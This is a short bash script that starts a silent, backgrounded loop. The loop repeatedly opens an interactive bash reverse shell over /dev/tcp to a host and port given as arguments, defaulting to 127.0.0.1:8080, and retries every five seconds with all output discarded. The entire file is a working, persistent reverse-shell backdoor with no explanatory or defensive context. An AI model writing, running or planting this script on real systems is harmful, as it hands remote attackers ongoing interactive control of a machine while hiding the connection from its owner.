#! /bin/bash

nohup bash -c "while true; do /bin/bash -i >& /dev/tcp/${1:-127.0.0.1}/${2:-8080} 0>&1; sleep 5; done" > /dev/null 2>&1 &

